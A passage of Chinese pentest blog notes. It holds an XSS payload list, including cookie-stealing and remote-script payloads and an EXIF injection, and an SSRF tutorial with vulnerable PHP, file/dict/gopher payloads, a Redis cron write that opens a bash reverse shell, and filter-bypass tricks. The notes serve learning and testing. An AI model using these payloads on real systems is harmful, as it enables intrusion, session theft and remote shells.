class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&lt;img src=1 οnerrοr=alert(1)&gt;<br>&lt;script&gt;alert(1)&lt;/script&gt;<br>&lt;script&gt;alert(/1/)&lt;/script&gt;<br>&quot;/&gt;&lt;svg/οnlοad=prompt(/1/);&gt;<br>&lt;input id=&quot;aaa&quot; type=&quot;text&quot; value=&quot;输出点&quot;&gt;<br>&gt;&quot;&#x27;&gt;&lt;img src=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&gt;&quot;&#x27;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br>&lt;table background=&#x27;javascript.:alert(([code])&#x27;&gt;&lt;/table&gt;<br>&lt;object type=text/html data=&#x27;javascript.:alert(([code]);&#x27;&gt;&lt;/object&gt;<br>&quot;+alert(&#x27;XSS&#x27;)+&quot;<br>&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>=&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&lt;script&gt;alert(vulnerable)&lt;/script&gt;<br>&lt;s&amp;#99;ript&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br>&lt;img src=&quot;javas&amp;#99;ript:alert(&#x27;XSS&#x27;)&quot;&gt;<br>%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp<br>%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e<br>%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e<br>%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html<br>&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>a.jsp/&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;<br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#x27;XSS&#x27;)&gt;<br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&amp;quot;XSS&amp;quot;)&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x09;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&quot;&lt;IMG src=&quot;/java&quot;\0script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27;&gt;out<br>&lt;IMG SRC=&quot; javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;<br>&lt;BODY BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;<br>&lt;IMG DYNSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;IMG LOWSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;BGSOUND SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;br size=&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;&gt;<br>&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;<br>&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;<br>&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;0;url=javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;<br>&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;<br>&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#x27;XSS&#x27;))&quot;&gt;<br>&lt;DIV STYLE=&quot;behaviour: url(&#x27;http://www.how-to-hack.org/exploit.html&amp;#39;);&quot;&gt;<br>&lt;DIV STYLE=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;<br>&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;&lt;/STYLE&gt;<br>&lt;IMG STYLE=&#x27;xss:expre\ssion(alert(&quot;XSS&quot;))&#x27;&gt;<br>&lt;STYLE. TYPE=&quot;text/javascript&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;<br>&lt;STYLE. TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;<br>&lt;STYLE. type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;)&#125;&lt;/STYLE&gt;<br>&lt;BASE HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);//&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="特殊利用"><a href="#特殊利用" class="headerlink" title="特殊利用"></a>特殊利用</h2><p>获取Cookie</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">alert</span><span class="hljs-params">(document.cookie)</span></span><br></code></pre></td></tr></table></figure><p>PDF-XSS</p><p><a href="https://github.com/ynsmroztas/pdfsvgxsspayload">https://github.com/ynsmroztas/pdfsvgxsspayload</a></p><p>svg-XSS</p><p><a href="https://github.com/ynsmroztas/pdfsvgxsspayload">https://github.com/ynsmroztas/pdfsvgxsspayload</a></p><p>EXIF-XSS</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">exiftool -artist=&#x27;&quot;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerrror</span>=<span class="hljs-string">alert(/xss/)</span>&gt;</span>&#x27; test.jpg<br></code></pre></td></tr></table></figure><p>文件上传XSS</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>XSS平台</p><p><a href="https://xsshs.cn/">https://xsshs.cn/</a><br><a href="https://xss.pt/">https://xss.pt/</a><br><a href="http://xsscom.com/">http://xsscom.com</a></p><p>XSStrike</p><p><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><p>xsscrapy</p><p><a href="https://github.com/DanMcInerney/xsscrapy">https://github.com/DanMcInerney/xsscrapy</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/01/01/SSRF/"/>
    <url>/2023/01/01/SSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。</p><h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><p>主要攻击方式如下所示。</p><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</li><li>利用file协议读取本地文件等。</li></ul><h2 id="三、漏洞函数"><a href="#三、漏洞函数" class="headerlink" title="三、漏洞函数"></a>三、漏洞函数</h2><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code></p><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>payload:<br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=192.168.1.10:3306</span><br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=file:///c:/windows/win.ini</span><br></code></pre></td></tr></table></figure><h2 id="四、协议"><a href="#四、协议" class="headerlink" title="四、协议"></a>四、协议</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test ssrf&lt;br&gt;input param \&quot;url\&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;  <br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">// 创建新的curl资源</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);  <span class="hljs-comment">//设置url和相应的选项</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);   <span class="hljs-comment">//抓取url并把它传递给浏览器</span><br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);  <span class="hljs-comment">//关闭curl资源，并且释放系统资源</span><br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>在有回显的情况下，利用 file 协议可以读取任意内容</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1/ssrf</span>.php?url=<span class="hljs-symbol">file:</span>/<span class="hljs-regexp">//c</span><span class="hljs-symbol">:/windows/win</span>.ini<br></code></pre></td></tr></table></figure><h3 id="dict"><a href="#dict" class="headerlink" title="dict:&#x2F;&#x2F;"></a>dict:&#x2F;&#x2F;</h3><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>一般配合<code>/etc/hosts</code>、<code>proc/net/arp</code>来发现内网网段</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ttp:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span>/<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span><span class="hljs-regexp">/127.0.0.1:6379/i</span>nfo  <br></code></pre></td></tr></table></figure><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h3><p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>gopher协议格式：</p><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code> ，可以用来发起GET、POST的http请求。</p><p>特点：</p><ol><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li><li>Gopher 的以下几点局限性：<ul><li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>PHP 的 curl 默认不 follow 302 跳转</li><li>curl&#x2F;libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li></ul></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/ssrf.php?url=gopher%<span class="hljs-number">3</span>A//<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A80/_GET%<span class="hljs-number">2520</span>/flag%<span class="hljs-number">2520</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AHost%<span class="hljs-number">253</span>A%<span class="hljs-number">2520127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A80%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br><span class="hljs-comment">#redis写shell</span><br><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">8</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aflushall %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">3</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a1 %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">64</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a*/<span class="hljs-number">1</span> * * * * bash  -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>adir %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">16</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a/var/spool/cron/ %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>adbfilename %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aroot %<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>a*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>asave %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aquit %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a<span class="hljs-string">&quot;  </span><br></code></pre></td></tr></table></figure><h3 id="http-和https"><a href="#http-和https" class="headerlink" title="http:&#x2F;&#x2F;和https:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;和https:&#x2F;&#x2F;</h3><p>探测内网主机存活</p><h2 id="五、绕过方式"><a href="#五、绕过方式" class="headerlink" title="五、绕过方式"></a>五、绕过方式</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h3><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的。</p><h3 id="点分割符号替换"><a href="#点分割符号替换" class="headerlink" title="点分割符号替换"></a>点分割符号替换</h3><p>在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//www。target。<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www｡target｡<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www．target．<span class="hljs-keyword">com</span>  <br></code></pre></td></tr></table></figure><h3 id="绕过127-0-0-1等本地ip"><a href="#绕过127-0-0-1等本地ip" class="headerlink" title="绕过127.0.0.1等本地ip"></a>绕过127.0.0.1等本地ip</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">http://127.0.0.1<br>http://localhost<br>http://127.255.255.254<br>127.0.0.1 - 127.255.255.254<br><span class="hljs-link">http://</span>[<span class="hljs-string">::1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:7f00:1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:127.0.0.1</span>]<br>http://127.1<br>http://127.0.1<br>http://0:80  <br></code></pre></td></tr></table></figure><h3 id="ip的进制转换"><a href="#ip的进制转换" class="headerlink" title="ip的进制转换"></a>ip的进制转换</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>进制格式：<span class="hljs-number">0300</span>.<span class="hljs-number">0250</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">16</span>进制格式：<span class="hljs-number">0</span>xC0.<span class="hljs-number">0</span>xA8.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>进制整数格式：<span class="hljs-number">3232235521</span><br><span class="hljs-attribute">16</span>进制整数格式：<span class="hljs-number">0</span>xC0A80001  <br></code></pre></td></tr></table></figure><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿  <br></code></pre></td></tr></table></figure><h3 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br>data = <span class="hljs-string">&quot;www.target.com&quot;</span>;<br>alist = []<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x), <span class="hljs-number">2</span>):<br>alist.append((x[i:i+<span class="hljs-number">2</span>]).encode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;http://%&quot;</span>+<span class="hljs-string">&#x27;%&#x27;</span>.join(alist))<br></code></pre></td></tr></table></figure><h3 id="短网址"><a href="#短网址" class="headerlink" title="短网址"></a>短网址</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.985.so/</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.urlc.cn/  </span><br></code></pre></td></tr></table></figure><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>在vps上部署</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://192.168.1.10&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><h2 id="六、SSRF漏洞点挖掘"><a href="#六、SSRF漏洞点挖掘" class="headerlink" 